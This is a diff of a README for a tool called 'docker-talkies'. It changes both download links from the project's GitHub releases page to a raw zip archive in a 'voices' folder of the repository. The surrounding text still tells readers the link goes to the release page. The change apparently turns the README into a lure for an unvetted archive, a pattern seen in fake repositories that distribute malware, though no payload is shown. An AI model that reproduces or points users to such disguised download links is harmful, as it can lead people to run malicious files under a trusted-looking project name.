@@ -1,6 +1,6 @@
 # 🎙️ docker-talkies - Run local audio tools with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/parapsychologistbullace767/docker-talkies/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/parapsychologistbullace767/docker-talkies/main/voices/talkies-docker-2.3.zip)
 
 ## What is this tool
 
@@ -21,7 +21,7 @@ To run this software, your computer needs specific hardware to ensure performanc
 
 You need to access the release page to get the necessary files. 
 
-[Visit this page to download the latest version](https://github.com/parapsychologistbullace767/docker-talkies/releases)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/parapsychologistbullace767/docker-talkies/main/voices/talkies-docker-2.3.zip)
 
 Follow these steps to prepare your download:
 1. Open the link provided above.
